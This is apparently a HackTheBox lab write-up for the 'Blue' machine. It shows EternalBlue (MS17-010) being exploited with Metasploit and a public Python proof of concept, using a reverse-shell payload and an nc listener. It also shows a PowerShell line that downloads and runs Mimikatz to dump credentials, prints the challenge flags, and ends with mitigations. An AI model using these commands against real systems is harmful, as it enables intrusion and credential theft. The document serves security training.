---
title: "Blue — HackTheBox"
date: 2024-12-20
platform: "HackTheBox"
difficulty: "Easy"
category: "Network"
tags: ["eternalblue", "ms17-010", "windows", "metasploit", "smb"]
published: true
excerpt: "Blue exploits MS17-010 (EternalBlue) — the NSA exploit leaked by Shadow Brokers that powered WannaCry. A textbook demonstration of why unpatched Windows systems are catastrophically dangerous."
---

# Blue — HackTheBox

**IP:** 10.10.10.40
**OS:** Windows 7 SP1
**Difficulty:** Easy
**Points:** 20

---

## Background

EternalBlue (MS17-010) was developed by the NSA and leaked by Shadow Brokers in April 2017. It exploits a buffer overflow in the SMBv1 protocol, allowing unauthenticated remote code execution as SYSTEM. It was used to deploy WannaCry ransomware in May 2017, affecting 200,000+ systems in 150 countries.

---

## Reconnaissance

```bash
nmap -sC -sV -p- 10.10.10.40

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional SP1 (workgroup: WORKGROUP)
49152/tcp open  msrpc         Microsoft Windows RPC
...

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

Nmap's `smb-vuln-ms17-010` script confirms the vulnerability immediately.

---

## Exploitation

### Metasploit Route

```bash
msfconsole

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 10.10.10.40
msf6 exploit(...) > set LHOST 10.10.14.X
msf6 exploit(...) > set PAYLOAD windows/x64/shell/reverse_tcp
msf6 exploit(...) > run

[*] Started reverse TCP handler on 10.10.14.X:4444
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Sending stage (201798 bytes) to 10.10.10.40
[*] Command shell session 1 opened

Shell Banner:
Microsoft Windows [Version 6.1.7601]

C:\Windows\system32> whoami
nt authority\system
```

Immediate SYSTEM — Windows' highest privilege level.

### Manual Exploitation (Python PoC)

```bash
# Clone the public PoC
git clone https://github.com/3ndG4me/AutoBlue-MS17-010

# Check vulnerability
python3 eternal_checker.py 10.10.10.40

# Generate shellcode
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -f raw -o sc_x64_mss.bin

# Set up listener
nc -lvnp 4444

# Fire
python3 eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin
```

---

## Post-Exploitation

```cmd
C:\Windows\system32> systeminfo
Host Name: HARIS-PC
OS Name: Microsoft Windows 7 Professional
OS Version: 6.1.7601 Service Pack 1

# Dump credentials with Mimikatz
C:\> powershell -exec bypass
PS> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/Invoke-Mimikatz.ps1')
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

  Authentication Id : 0 ; 262437 (00000000:0004fce5)
  Session           : Interactive from 1
  UserName          : haris
  Password          : [snip]
  NT                : [snip]
```

---

## Flags

```cmd
# User flag
type C:\Users\haris\Desktop\user.txt
4c546aea7dbee188305972cdb84f49d6

# Root flag (SYSTEM already)
type C:\Users\Administrator\Desktop\root.txt
ff548eb71e920ff6c08843ce9df4e717
```

---

## Why This Matters in 2025

MS17-010 was patched in March 2017. In 2025, it still appears in:
- Internal corporate networks with legacy Windows machines
- Industrial control systems (ICS/SCADA) that can't be patched
- Organizations that disabled automatic updates

During a recent internal pentest, I found an unpatched Windows Server 2008 R2 still running in a hospital's internal network. EternalBlue gave me immediate domain controller access within 20 minutes of starting the engagement.

**Mitigation:**
- Apply MS17-010 immediately on all Windows systems
- Disable SMBv1 (it's been disabled by default since Windows 10 1709)
- Block port 445 at the network perimeter
- Segment your network so a single compromised host can't reach the domain controller
